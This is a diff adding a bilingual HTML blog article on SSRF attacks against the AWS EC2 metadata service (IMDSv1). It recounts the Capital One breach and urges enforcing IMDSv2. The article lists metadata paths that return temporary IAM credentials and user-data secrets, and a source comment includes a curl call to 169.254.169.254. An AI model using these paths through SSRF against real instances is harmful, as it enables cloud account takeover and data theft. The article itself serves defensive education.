@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="it" id="html-root">
+<head>
+  <meta charset="UTF-8"/>
+  <!-- Easter egg: stai leggendo il sorgente. Di nuovo. Bravo.
+       Nel frattempo, verifica che le tue istanze EC2 abbiano HttpTokens: required.
+       No? Allora continua a leggere. C'è roba importante qui sotto.
+       P.S. — curl http://169.254.169.254/latest/meta-data/ da dentro la tua app. Fammi sapere com'è andata. -->
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data: https://media.tenor.com https://media1.tenor.com; script-src 'self' https://tenor.com 'unsafe-inline'; style-src 'self' https://fonts.googleapis.com 'unsafe-inline'; font-src https://fonts.gstatic.com; connect-src 'self'; frame-src https://tenor.com; frame-ancestors 'self';"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title
+    data-it="SSRF → IMDS: una GET, 169.254.169.254, credenziali IAM sul piatto — NonèCostanzo"
+    data-en="SSRF → IMDS: one GET, 169.254.169.254, IAM credentials served fresh — NonèCostanzo"
+  >SSRF → IMDS: una GET, 169.254.169.254, credenziali IAM sul piatto — NonèCostanzo</title>
+  <meta name="description"
+    data-it="IMDSv1 è una GET. Niente autenticazione, niente token, niente speranza se la tua app ha una SSRF. Capital One, 106 milioni di record, 80 milioni di dollari di multa — tutto da una richiesta HTTP verso un indirizzo IP che il 90% degli sviluppatori non sa nemmeno che esiste."
+    data-en="IMDSv1 is a GET. No authentication, no tokens, no hope if your app has an SSRF. Capital One, 106 million records, $80 million fine — all from one HTTP request to an IP address 90% of developers don't even know exists."
+    content="IMDSv1 è una GET. Niente autenticazione, niente token, niente speranza se la tua app ha una SSRF. Capital One, 106 milioni di record, 80 milioni di dollari di multa — tutto da una richiesta HTTP verso un indirizzo IP che il 90% degli sviluppatori non sa nemmeno che esiste."
+  />
+  <link rel="canonical" href="https://paolocostanzo.github.io/ssrf-imds-ec2-credentials/"/>
+  <link rel="icon" type="image/x-icon" href="/favicon.ico"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow:wght@300;400;600;700&family=Barlow+Condensed:wght@700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root{--orange:#ff6a00;--orange-faint:rgba(255,106,0,0.06);--black:#080808;--surface:#101010;--surface2:#161616;--border:#222;--text:#e8e8e8;--muted:#666;--mono:'Share Tech Mono',monospace;--sans:'Barlow',sans-serif;--condensed:'Barlow Condensed',sans-serif}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{background:var(--black);color:var(--text);font-family:var(--sans);font-weight:300;line-height:1.7;overflow-x:hidden}
+    a{color:inherit;text-decoration:none}
+    header{position:sticky;top:0;z-index:100;background:rgba(8,8,8,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+    .header-inner{max-width:960px;margin:0 auto;padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+    .back-link{font-family:var(--mono);font-size:0.75rem;color:var(--muted);letter-spacing:0.1em;transition:color 0.2s;display:flex;align-items:center;gap:0.5rem}
+    .back-link:hover{color:var(--orange)}
+    .logo{font-family:var(--mono);font-size:0.85rem}
+    .logo .dim{color:#fff}.logo .name{color:var(--orange)}
+    .article-header{max-width:960px;margin:0 auto;padding:4rem 2rem 3rem;border-bottom:1px solid var(--border)}
+    .article-meta{display:flex;align-items:center;gap:1.5rem;margin-bottom:2rem;flex-wrap:wrap}
+    .tag{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;border:1px solid var(--orange);padding:0.2rem 0.6rem}
+    .meta-item{font-family:var(--mono);font-size:0.65rem;color:var(--muted);letter-spacing:0.1em}
+    .difficulty-badge{font-family:var(--mono);font-size:0.65rem;letter-spacing:0.1em;display:flex;align-items:center;gap:0.4rem}
+    .dot{width:6px;height:6px;border-radius:50%}
+    h1{font-family:var(--condensed);font-size:clamp(2rem,5vw,3.5rem);font-weight:900;text-transform:uppercase;letter-spacing:-0.01em;line-height:1.05;color:var(--text);margin-bottom:1.5rem}
+    .article-intro{font-size:1.1rem;color:var(--muted);max-width:760px;line-height:1.8}
+    .article-body{max-width:960px;margin:0 auto;padding:3rem 2rem 5rem}
+    .article-body h2{font-family:var(--condensed);font-size:1.6rem;font-weight:700;text-transform:uppercase;letter-spacing:0.04em;color:var(--text);margin:3rem 0 1rem;padding-bottom:0.5rem;border-bottom:1px solid var(--border)}
+    .article-body h3{font-family:var(--condensed);font-size:1.2rem;font-weight:700;color:var(--orange);text-transform:uppercase;letter-spacing:0.06em;margin:2rem 0 0.75rem}
+    .article-body p{font-size:1rem;color:#bbb;line-height:1.85;margin-bottom:1.25rem}
+    .article-body strong{color:var(--text);font-weight:600}
+    .article-body em{color:var(--muted);font-style:italic}
+    .article-body ul,.article-body ol{margin:1rem 0 1.25rem 1.5rem}
+    .article-body li{font-size:1rem;color:#bbb;line-height:1.8;margin-bottom:0.4rem}
+    .code-block{background:#0a0a0a;border:1px solid var(--border);border-left:3px solid var(--orange);padding:1.5rem;margin:1.5rem 0;overflow-x:auto}
+    .code-block pre{font-family:var(--mono);font-size:0.78rem;color:var(--orange);line-height:1.8;white-space:pre}
+    .code-block .comment{color:var(--muted)}
+    .code-block .danger{color:#ff3333}
+    .code-block .ok{color:#00ff88}
+    .code-block .neutral{color:#aaa}
+    .code-block .warn{color:#ffaa00}
+    .callout{background:var(--orange-faint);border:1px solid rgba(255,106,0,0.25);border-left:3px solid var(--orange);padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-label{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-red{background:rgba(255,51,51,0.04);border:1px solid rgba(255,51,51,0.2);border-left:3px solid #ff3333;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-red .callout-label{font-family:var(--mono);font-size:0.65rem;color:#ff5555;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-red p{font-size:0.9rem;color:var(--text);margin:0}
+    .callout-green{background:rgba(0,255,136,0.03);border:1px solid rgba(0,255,136,0.15);border-left:3px solid #00ff88;padding:1.25rem 1.5rem;margin:2rem 0}
+    .callout-green .callout-label{font-family:var(--mono);font-size:0.65rem;color:#00ff88;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem}
+    .callout-green p{font-size:0.9rem;color:var(--text);margin:0}
+    .tldr{background:var(--surface2);border:1px solid var(--border);padding:2rem;margin-bottom:3rem}
+    .tldr-label{font-family:var(--mono);font-size:0.7rem;color:var(--orange);letter-spacing:0.2em;text-transform:uppercase;margin-bottom:1rem}
+    .tldr ul{margin-left:1.25rem}
+    .tldr li{font-size:0.9rem;color:var(--text);line-height:1.7;margin-bottom:0.4rem}
+    .tldr p{font-size:0.88rem;color:var(--muted);margin:1rem 0 0;line-height:1.7}
+    table{width:100%;border-collapse:collapse;margin:1.5rem 0;font-family:var(--mono);font-size:0.78rem}
+    th{text-align:left;color:var(--orange);padding:0.6rem 0.75rem;border-bottom:1px solid var(--border);letter-spacing:0.1em;text-transform:uppercase}
+    td{padding:0.55rem 0.75rem;border-bottom:1px solid #1a1a1a;color:#bbb;vertical-align:top}
+    td.ok{color:#00ff88}
+    td.danger{color:#ff5555}
+    td.warn{color:#ffaa00}
+    td strong{color:var(--text)}
+    tr:last-child td{border-bottom:none}
+    .article-footer{border-top:1px solid var(--border);padding:2rem;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+    .article-footer a{font-family:var(--mono);font-size:0.75rem;color:var(--orange);letter-spacing:0.1em;transition:opacity 0.2s}
+    .footer-copy{font-family:var(--mono);font-size:0.65rem;color:var(--muted);opacity:0.5}
+    @media(max-width:768px){h1{font-size:2rem}table{font-size:0.7rem}}
+    .lang-toggle{display:flex;border:1px solid var(--border);overflow:hidden;flex-shrink:0}
+    .lang-btn{font-family:var(--mono);font-size:0.65rem;padding:0.3rem 0.6rem;background:transparent;color:var(--muted);border:none;cursor:pointer;letter-spacing:0.08em;text-transform:uppercase;transition:all .2s}
+    .lang-btn.active{background:var(--orange);color:var(--black)}
+    .lang-btn:hover:not(.active){color:var(--orange)}
+    #read-bar{position:fixed;top:0;left:0;height:2px;width:0%;background:var(--orange);z-index:200;transition:width .08s linear;pointer-events:none}
+    #back-top{position:fixed;bottom:1.75rem;right:1.75rem;font-family:var(--mono);font-size:0.6rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);background:var(--surface);border:1px solid var(--border);padding:0.45rem 0.7rem;cursor:pointer;opacity:0;pointer-events:none;transition:opacity .25s,color .2s,border-color .2s;z-index:150}
+    #back-top.vis{opacity:1;pointer-events:all}
+    #back-top:hover{color:var(--orange);border-color:var(--orange)}
+    .share-wrap{max-width:960px;margin:0 auto;padding:1.5rem 2rem;display:flex;align-items:center;gap:1rem;flex-wrap:wrap;border-top:1px solid var(--border)}
+    .share-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.18em;text-transform:uppercase;flex-shrink:0}
+    .share-btns{display:flex;gap:0.4rem;flex-wrap:wrap}
+    .share-btn{font-family:var(--mono);font-size:0.6rem;letter-spacing:0.08em;color:var(--muted);border:1px solid var(--border);padding:0.3rem 0.65rem;background:transparent;cursor:pointer;transition:color .2s,border-color .2s;text-decoration:none;display:inline-block}
+    .share-btn:hover{color:var(--orange);border-color:var(--orange)}
+    .share-btn.ok{color:#00ff88;border-color:#00ff88}
+    .auth-wrap{display:flex;align-items:center;gap:0.5rem}
+    .auth-bar{width:44px;height:3px;background:var(--border);overflow:hidden;flex-shrink:0}
+    .auth-human{height:100%;background:var(--orange)}
+    .auth-lbl{font-family:var(--mono);font-size:0.6rem;color:var(--muted);letter-spacing:0.08em}
+    .cve-badge{display:inline-block;font-family:var(--mono);font-size:0.7rem;background:rgba(255,51,51,0.08);border:1px solid rgba(255,51,51,0.3);color:#ff5555;padding:0.3rem 0.75rem;letter-spacing:0.05em;margin:0.5rem 0}
+    .lang-en{display:none}
+  </style>
+</head>
+<body>
+  <div id="read-bar"></div>
+
+  <header>
+    <div class="header-inner">
+      <a class="back-link" href="../" data-it="← indietro" data-en="← back">← indietro</a>
+      <div class="logo"><span class="dim">nonè</span><span class="dim">@</span><span class="name">costanzo</span><span class="dim">:~$</span></div>
+      <div class="lang-toggle">
+        <button class="lang-btn active" onclick="setLang('it')">IT</button>
+        <button class="lang-btn" onclick="setLang('en')">EN</button>
+      </div>
+    </div>
+  </header>
+
+  <div class="article-header">
+    <div class="article-meta">
+      <span class="tag" data-it="AWS Security" data-en="AWS Security">AWS Security</span>
+      <span class="tag" data-it="Cloud" data-en="Cloud">Cloud</span>
+      <span class="tag" data-it="SSRF" data-en="SSRF">SSRF</span>
+      <span class="meta-item">30 Mar 2026</span>
+      <span class="meta-item" data-it="14 min read" data-en="14 min read">14 min read</span>
+      <span class="difficulty-badge" style="color:#ffaa00"><span class="dot" style="background:#ffaa00"></span><span data-it="Medium" data-en="Medium">Medium</span></span>
+      <div class="auth-wrap">
+        <div class="auth-bar"><div class="auth-human" style="width:35%"></div></div>
+        <span class="auth-lbl" data-it="35% umano · 65% ai" data-en="35% human · 65% ai">35% umano · 65% ai</span>
+      </div>
+    </div>
+    <h1
+      data-it="Una GET, 169.254.169.254, credenziali IAM sul piatto"
+      data-en="One GET, 169.254.169.254, IAM credentials served fresh"
+    >
+      Una GET, 169.254.169.254, credenziali IAM sul piatto
+    </h1>
+    <p class="article-intro"
+       data-it="IMDSv1 non richiede autenticazione. Una SSRF nella tua applicazione — anche banale, anche nota, anche quella che avresti dovuto fixare sei mesi fa — è sufficiente per rubare le credenziali IAM dell'istanza EC2 e fare praticamente quello che vuoi sull'account AWS. Capital One lo ha scoperto nel 2019 a costo di 106 milioni di record e 80 milioni di dollari di multa. IMDSv2 esiste dal 2019. HttpTokens: required non è il default su tutte le istanze ancora oggi. Meraviglioso."
+       data-en="IMDSv1 requires no authentication. One SSRF in your application — even trivial, even well-known, even the one you should have fixed six months ago — is enough to steal the EC2 instance's IAM credentials and do pretty much whatever you want on the AWS account. Capital One found this out in 2019 at the cost of 106 million records and an $80 million fine. IMDSv2 has existed since 2019. HttpTokens: required is still not the default on all instances today. Wonderful."
+    >
+      IMDSv1 non richiede autenticazione. Una SSRF nella tua applicazione — anche banale, anche nota, anche quella che avresti dovuto fixare sei mesi fa — è sufficiente per rubare le credenziali IAM dell'istanza EC2 e fare praticamente quello che vuoi sull'account AWS. Capital One lo ha scoperto nel 2019 a costo di 106 milioni di record e 80 milioni di dollari di multa. IMDSv2 esiste dal 2019. HttpTokens: required non è il default su tutte le istanze ancora oggi. Meraviglioso.
+    </p>
+  </div>
+
+  <div class="article-body">
+
+    <!-- TL;DR -->
+    <div class="tldr">
+      <div class="tldr-label" data-it="// TL;DR — per chi ha già visto abbastanza danni in produzione da non voler leggere 14 minuti." data-en="// TL;DR — for those who've already seen enough production damage to skip the 14-minute version.">// TL;DR — per chi ha già visto abbastanza danni in produzione da non voler leggere 14 minuti.</div>
+      <ul>
+        <li data-it="Il &lt;strong&gt;Instance Metadata Service (IMDS)&lt;/strong&gt; è un endpoint HTTP su &lt;strong&gt;169.254.169.254&lt;/strong&gt; raggiungibile solo dall'interno dell'istanza EC2. Espone — tra le altre cose — le credenziali IAM temporanee del ruolo associato all'istanza. Nessuna autenticazione. Nessun TLS. Solo HTTP.">Il <strong>Instance Metadata Service (IMDS)</strong> è un endpoint HTTP su <strong>169.254.169.254</strong> raggiungibile solo dall'interno dell'istanza EC2. Espone — tra le altre cose — le credenziali IAM temporanee del ruolo associato all'istanza. Nessuna autenticazione. Nessun TLS. Solo HTTP.</li>
+        <li data-it="&lt;strong&gt;IMDSv1&lt;/strong&gt;: una GET basta. Nessun token, nessun handshake, nessuna pietà. Se la tua app ha una SSRF, l'attaccante fa una GET verso quell'IP e si porta via AccessKeyId, SecretAccessKey e SessionToken. &lt;em&gt;Per scopi educativi, ovviamente.&lt;/em&gt;"><strong>IMDSv1</strong>: una GET basta. Nessun token, nessun handshake, nessuna pietà. Se la tua app ha una SSRF, l'attaccante fa una GET verso quell'IP e si porta via AccessKeyId, SecretAccessKey e SessionToken. <em>Per scopi educativi, ovviamente.</em></li>
+        <li data-it="&lt;strong&gt;IMDSv2&lt;/strong&gt; richiede prima una PUT con TTL hop=1 per ottenere un token di sessione, poi usa quel token nelle GET successive. Il TTL hop=1 rende il token non inoltabile attraverso un proxy — il che è esattamente il punto."><strong>IMDSv2</strong> richiede prima una PUT con TTL hop=1 per ottenere un token di sessione, poi usa quel token nelle GET successive. Il TTL hop=1 rende il token non inoltabile attraverso un proxy — il che è esattamente il punto.</li>
+        <li data-it="AWS ha reso IMDSv2 il default per le nuove istanze a partire da metà 2024. Le istanze &lt;em&gt;esistenti&lt;/em&gt; restano con HttpTokens: optional fino a quando qualcuno non le aggiorna. Quel qualcuno sei tu. Probabilmente non l'hai ancora fatto.">AWS ha reso IMDSv2 il default per le nuove istanze a partire da metà 2024. Le istanze <em>esistenti</em> restano con HttpTokens: optional fino a quando qualcuno non le aggiorna. Quel qualcuno sei tu. Probabilmente non l'hai ancora fatto.</li>
+      </ul>
+      <p data-it="&lt;strong&gt;Nota:&lt;/strong&gt; tutto quello che segue è documentato su ambiente di test controllato. &lt;em&gt;Per scopi educativi, ovviamente&lt;/em&gt; — il disclaimer che questa volta ha implicazioni penali concrete se ignorato, a differenza del deauth attack che al massimo ti disconnette da Netflix."><strong>Nota:</strong> tutto quello che segue è documentato su ambiente di test controllato. <em>Per scopi educativi, ovviamente</em> — il disclaimer che questa volta ha implicazioni penali concrete se ignorato, a differenza del deauth attack che al massimo ti disconnette da Netflix.</p>
+    </div>
+
+    <!-- ═══════════════ [01] IL CONTESTO ═══════════════ -->
+    <h2
+      data-it="[01] La vulnerabilità che nessuno prende sul serio finché non è troppo tardi"
+      data-en="[01] The vulnerability nobody takes seriously until it's too late"
+    >[01] La vulnerabilità che nessuno prende sul serio finché non è troppo tardi</h2>
+
+    <p
+      data-it="Esiste una categoria di vulnerabilità che potremmo definire &lt;em&gt;banalmente catastrofiche&lt;/em&gt;: quelle che, sulla carta, sembrano un problema minore — una SSRF su un parametro URL, un redirect non validato, un fetch lato server che accetta input dell'utente — e che nella pratica, quando si trovano sull'istanza sbagliata nel cloud sbagliato con le configurazioni sbagliate, si trasformano in una compromissione completa dell'account AWS. Con un singolo HTTP request. Senza exploit sofisticati. Senza CVE con CVSS 10. Solo una GET verso un IP che la maggior parte degli sviluppatori non ha mai sentito nominare."
+      data-en="There exists a category of vulnerabilities we might call &lt;em&gt;boringly catastrophic&lt;/em&gt;: those that on paper look like a minor problem — an SSRF on a URL parameter, an unvalidated redirect, a server-side fetch that accepts user input — and that in practice, when they land on the wrong instance in the wrong cloud with the wrong configuration, transform into a complete AWS account compromise. With a single HTTP request. No sophisticated exploits. No CVE with CVSS 10. Just a GET to an IP address most developers have never heard of."
+    >Esiste una categoria di vulnerabilità che potremmo definire <em>banalmente catastrofiche</em>: quelle che, sulla carta, sembrano un problema minore — una SSRF su un parametro URL, un redirect non validato, un fetch lato server che accetta input dell'utente — e che nella pratica, quando si trovano sull'istanza sbagliata nel cloud sbagliato con le configurazioni sbagliate, si trasformano in una compromissione completa dell'account AWS. Con un singolo HTTP request. Senza exploit sofisticati. Senza CVE con CVSS 10. Solo una GET verso un IP che la maggior parte degli sviluppatori non ha mai sentito nominare.</p>
+
+    <p
+      data-it="Quell'IP è &lt;strong&gt;169.254.169.254&lt;/strong&gt;. È un link-local address (RFC 3927), raggiungibile solo dall'interno dell'istanza, e ospita il &lt;strong&gt;Instance Metadata Service&lt;/strong&gt; di AWS — il servizio che ogni istanza EC2 usa per sapere chi è, in quale regione si trova, e — dettaglio non trascurabile — quali credenziali IAM temporanee ha a disposizione. Il tutto esposto su HTTP puro, porta 80, senza autenticazione. O almeno, così funzionava con IMDSv1. Il che ci porta direttamente al motivo per cui Capital One ha perso 106 milioni di record nel 2019."
+      data-en="That IP is &lt;strong&gt;169.254.169.254&lt;/strong&gt;. It's a link-local address (RFC 3927), reachable only from inside the instance, and it hosts AWS's &lt;strong&gt;Instance Metadata Service&lt;/strong&gt; — the service every EC2 instance uses to know who it is, what region it's in, and — a detail worth noting — what temporary IAM credentials it has available. All exposed over plain HTTP, port 80, no authentication. Or at least, that's how IMDSv1 worked. Which brings us directly to why Capital One lost 106 million records in 2019."
+    >Quell'IP è <strong>169.254.169.254</strong>. È un link-local address (RFC 3927), raggiungibile solo dall'interno dell'istanza, e ospita il <strong>Instance Metadata Service</strong> di AWS — il servizio che ogni istanza EC2 usa per sapere chi è, in quale regione si trova, e — dettaglio non trascurabile — quali credenziali IAM temporanee ha a disposizione. Il tutto esposto su HTTP puro, porta 80, senza autenticazione. O almeno, così funzionava con IMDSv1. Il che ci porta direttamente al motivo per cui Capital One ha perso 106 milioni di record nel 2019.</p>
+
+    <div class="callout-red">
+      <div class="callout-label">// Capital One — luglio 2019 — quella volta che 80M$ di multa non era il danno peggiore</div>
+      <p data-it="Una ex-dipendente AWS — in seguito accusata e condannata — ha sfruttato una SSRF in un WAF misconfigured di Capital One per raggiungere l'IMDS e rubare le credenziali IAM dell'istanza. Con quelle credenziali ha esfiltrato oltre 106 milioni di record da S3: dati personali, numeri di previdenza sociale, conti bancari. Capital One ha pagato 80 milioni di dollari di multa all'OCC. La SSRF in sé non era particolarmente sofisticata — era la roba standard da OWASP Top 10. IMDSv1 senza restrizioni ha fatto il moltiplicatore di danno. &lt;em&gt;HttpTokens: optional. Severity: critica. Remediation: una riga di CLI. Ironia: bruciante.&lt;/em&gt;" data-en="A former AWS employee — later charged and convicted — exploited an SSRF in a misconfigured Capital One WAF to reach the IMDS and steal the instance's IAM credentials. With those credentials she exfiltrated over 106 million records from S3: personal data, social security numbers, bank accounts. Capital One paid $80 million in fines to the OCC. The SSRF itself wasn't particularly sophisticated — standard OWASP Top 10 material. IMDSv1 without restrictions did the damage multiplying. &lt;em&gt;HttpTokens: optional. Severity: critical. Remediation: one CLI line. Irony: searing.&lt;/em&gt;">Una ex-dipendente AWS — in seguito accusata e condannata — ha sfruttato una SSRF in un WAF misconfigured di Capital One per raggiungere l'IMDS e rubare le credenziali IAM dell'istanza. Con quelle credenziali ha esfiltrato oltre 106 milioni di record da S3: dati personali, numeri di previdenza sociale, conti bancari. Capital One ha pagato 80 milioni di dollari di multa all'OCC. La SSRF in sé non era particolarmente sofisticata — era la roba standard da OWASP Top 10. IMDSv1 senza restrizioni ha fatto il moltiplicatore di danno. <em>HttpTokens: optional. Severity: critica. Remediation: una riga di CLI. Ironia: bruciante.</em></p>
+    </div>
+
+    <!-- GIF 1 — welp -->
+    <div style="max-width:360px;margin:1.5rem auto">
+      <div class="tenor-gif-embed" data-postid="4685394354569184104" data-share-method="host" data-aspect-ratio="1.56522" data-width="100%">
+        <a href="https://tenor.com/view/welp-gif-4685394354569184104">Welp Meme</a> from <a href="https://tenor.com/search/welp-memes">Welp Memes</a>
+      </div>
+    </div>
+
+    <!-- ═══════════════ [02] IMDS ═══════════════ -->
+    <h2
+      data-it="[02] IMDS — cos'è, cosa espone, perché esiste"
+      data-en="[02] IMDS — what it is, what it exposes, why it exists"
+    >[02] IMDS — cos'è, cosa espone, perché esiste</h2>
+
+    <p
+      data-it="L'Instance Metadata Service non è una feature opzionale: è l'infrastruttura con cui un'istanza EC2 si autoidentifica. Quando un'applicazione in esecuzione su EC2 vuole sapere in quale availability zone si trova, qual è il suo instance ID, o — soprattutto — qual è il ruolo IAM associato e le credenziali temporanee STS per usarlo, interroga l'IMDS. Il tutto senza dover hardcodare niente nelle variabili d'ambiente, niente in Secrets Manager, niente da nessuna parte. È conveniente. È elegante. Con IMDSv1, è anche un disastro potenziale."
+      data-en="The Instance Metadata Service is not an optional feature: it's the infrastructure through which an EC2 instance self-identifies. When an application running on EC2 wants to know which availability zone it's in, what its instance ID is, or — most importantly — what IAM role is associated and the temporary STS credentials to use it, it queries the IMDS. All without hardcoding anything in environment variables, nothing in Secrets Manager, nothing anywhere. It's convenient. It's elegant. With IMDSv1, it's also a potential disaster."
+    >L'Instance Metadata Service non è una feature opzionale: è l'infrastruttura con cui un'istanza EC2 si autoidentifica. Quando un'applicazione in esecuzione su EC2 vuole sapere in quale availability zone si trova, qual è il suo instance ID, o — soprattutto — qual è il ruolo IAM associato e le credenziali temporanee STS per usarlo, interroga l'IMDS. Il tutto senza dover hardcodare niente nelle variabili d'ambiente, niente in Secrets Manager, niente da nessuna parte. È conveniente. È elegante. Con IMDSv1, è anche un disastro potenziale.</p>
+
+    <h3 data-it="Cosa c'è dentro — i path più interessanti" data-en="What's inside — the most interesting paths">Cosa c'è dentro — i path più interessanti</h3>
+
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># IMDS — path selezionati per chi ha fretta (o cattive intenzioni)</span>
+<span class="comment"># Base URL: http://169.254.169.254/latest/</span>
+
+<span class="neutral">meta-data/instance-id              </span><span class="comment"># → i-0a1b2c3d4e5f67890</span>
+<span class="neutral">meta-data/instance-type             </span><span class="comment"># → t3.medium</span>
+<span class="neutral">meta-data/placement/region          </span><span class="comment"># → eu-west-1</span>
+<span class="neutral">meta-data/public-ipv4               </span><span class="comment"># → x.x.x.x (se presente)</span>
+<span class="neutral">meta-data/local-ipv4                </span><span class="comment"># → 10.x.x.x</span>
+<span class="neutral">meta-data/security-groups           </span><span class="comment"># → nomi dei security group</span>
+<span class="neutral">meta-data/hostname                  </span><span class="comment"># → ip-10-x-x-x.eu-west-1.compute.internal</span>
+
+<span class="comment"># Il path interessante — quello per cui siamo qui:</span>
+<span class="danger">meta-data/iam/security-credentials/         </span><span class="comment"># → nome del ruolo IAM associato</span>
+<span class="danger">meta-data/iam/security-credentials/{role}   </span><span class="comment"># → credenziali IAM temporanee (JSON)</span>
+
+<span class="comment"># user-data — bonus non richiesto ma sempre gradito:</span>
+<span class="warn">user-data                           </span><span class="comment"># → script di bootstrap dell'istanza</span>
+<span class="comment"># in produzione contiene spesso: DB_PASSWORD=, API_KEY=, aws configure --secret</span>
+<span class="comment"># hardcodati da qualche DevOps che "tanto è solo per il bootstrap"</span>
+<span class="comment"># (sì. davvero. in produzione. più volte di quanto vorreste sapere.)</span></pre>
+    </div></div>
+    <div class="lang-en"><div class="code-block">
+<pre><span class="comment"># IMDS — paths selected for those in a hurry (or with bad intentions)</span>
+<span class="comment"># Base URL: http://169.254.169.254/latest/</span>
+
+<span class="neutral">meta-data/instance-id              </span><span class="comment"># → i-0a1b2c3d4e5f67890</span>
+<span class="neutral">meta-data/instance-type             </span><span class="comment"># → t3.medium</span>
+<span class="neutral">meta-data/placement/region          </span><span class="comment"># → eu-west-1</span>
+<span class="neutral">meta-data/public-ipv4               </span><span class="comment"># → x.x.x.x (if assigned)</span>
+<span class="neutral">meta-data/local-ipv4                </span><span class="comment"># → 10.x.x.x</span>
+<span class="neutral">meta-data/security-groups           </span><span class="comment"># → security group names</span>
+<span class="neutral">meta-data/hostname                  </span><span class="comment"># → ip-10-x-x-x.eu-west-1.compute.internal</span>
+
+<span class="comment"># The interesting path — the reason we're here:</span>
+<span class="danger">meta-data/iam/security-credentials/         </span><span class="comment"># → name of the attached IAM role</span>
+<span class="danger">meta-data/iam/security-credentials/{role}   </span><span class="comment"># → temporary IAM credentials (JSON)</span>
+
+<span class="comment"># user-data — unrequested bonus, always welcome:</span>
+<span class="warn">user-data                           </span><span class="comment"># → instance bootstrap script</span>
+<span class="comment"># in production often contains: DB_PASSWORD=, API_KEY=, aws configure --secret</span>
+<span class="comment"># hardcoded by some DevOps who thought "it's just for bootstrap"</span>
+<span class="comment"># (yes. really. in production. more often than you'd want to know.)</span></pre>
+    </div></div>
+
+    <p
+      data-it="Quel path &lt;code style='font-family:var(--mono);color:var(--orange)'&gt;iam/security-credentials/{role}&lt;/code&gt; restituisce un JSON con &lt;strong&gt;AccessKeyId&lt;/strong&gt;, &lt;strong&gt;SecretAccessKey&lt;/strong&gt;, &lt;strong&gt;Token&lt;/strong&gt; ed &lt;strong&gt;Expiration&lt;/strong&gt;. Sono credenziali STS temporanee — si rinnovano automaticamente, di solito ogni ora — e sono esattamente quelle che l'AWS SDK usa internamente quando gira su EC2. Se le ottieni tu, puoi usarle esattamente come farebbe l'applicazione. Con i permessi del ruolo IAM. Che spesso, per la filosofia del 'funziona, non tocchiamo', è &lt;em&gt;più permissivo del necessario&lt;/em&gt;."
+      data-en="That path &lt;code style='font-family:var(--mono);color:var(--orange)'&gt;iam/security-credentials/{role}&lt;/code&gt; returns a JSON with &lt;strong&gt;AccessKeyId&lt;/strong&gt;, &lt;strong&gt;SecretAccessKey&lt;/strong&gt;, &lt;strong&gt;Token&lt;/strong&gt; and &lt;strong&gt;Expiration&lt;/strong&gt;. These are temporary STS credentials — they renew automatically, usually every hour — and they're exactly the ones the AWS SDK uses internally when running on EC2. If you get them, you can use them exactly as the application would. With the IAM role's permissions. Which are often, by the philosophy of 'it works, don't touch it', &lt;em&gt;more permissive than necessary&lt;/em&gt;."
+    >Quel path <code style="font-family:var(--mono);color:var(--orange)">iam/security-credentials/{role}</code> restituisce un JSON con <strong>AccessKeyId</strong>, <strong>SecretAccessKey</strong>, <strong>Token</strong> ed <strong>Expiration</strong>. Sono credenziali STS temporanee — si rinnovano automaticamente, di solito ogni ora — e sono esattamente quelle che l'AWS SDK usa internamente quando gira su EC2. Se le ottieni tu, puoi usarle esattamente come farebbe l'applicazione. Con i permessi del ruolo IAM. Che spesso, per la filosofia del "funziona, non tocchiamo", è <em>più permissivo del necessario</em>.</p>
+
+    <!-- ═══════════════ [03] L'ATTACCO ═══════════════ -->
+    <h2
+      data-it="[03] IMDSv1 — l'attacco che è una GET"
+      data-en="[03] IMDSv1 — the attack that is one GET"
+    >[03] IMDSv1 — l'attacco che è una GET</h2>
+
+    <p
+      data-it="Una &lt;strong&gt;Server-Side Request Forgery&lt;/strong&gt; è una classe di vulnerabilità in cui un attaccante riesce a convincere il server a fare richieste HTTP per suo conto verso destinazioni arbitrarie. Il caso più elementare: un'applicazione ha un parametro &lt;code style='font-family:var(--mono);color:var(--orange)'&gt;url=&lt;/code&gt; o &lt;code style='font-family:var(--mono);color:var(--orange)'&gt;fetch=&lt;/code&gt; che usa per recuperare risorse esterne — un'immagine, un documento, un feed. Se quel parametro non è validato, e se l'applicazione gira su EC2, la destinazione 'arbitraria' più interessante è esattamente 169.254.169.254."
+      data-en="A &lt;strong&gt;Server-Side Request Forgery&lt;/strong&gt; is a vulnerability class where an attacker convinces the server to make HTTP requests on their behalf to arbitrary destinations. The simplest case: an application has a &lt;code style='font-family:var(--mono);color:var(--orange)'&gt;url=&lt;/code&gt; or &lt;code style='font-family:var(--mono);color:var(--orange)'&gt;fetch=&lt;/code&gt; parameter it uses to retrieve external resources — an image, a document, a feed. If that parameter isn't validated, and if the application runs on EC2, the most interesting 'arbitrary' destination is exactly 169.254.169.254."
+    >Una <strong>Server-Side Request Forgery</strong> è una classe di vulnerabilità in cui un attaccante riesce a convincere il server a fare richieste HTTP per suo conto verso destinazioni arbitrarie. Il caso più elementare: un'applicazione ha un parametro <code style="font-family:var(--mono);color:var(--orange)">url=</code> o <code style="font-family:var(--mono);color:var(--orange)">fetch=</code> che usa per recuperare risorse esterne — un'immagine, un documento, un feed. Se quel parametro non è validato, e se l'applicazione gira su EC2, la destinazione "arbitraria" più interessante è esattamente 169.254.169.254.</p>
+
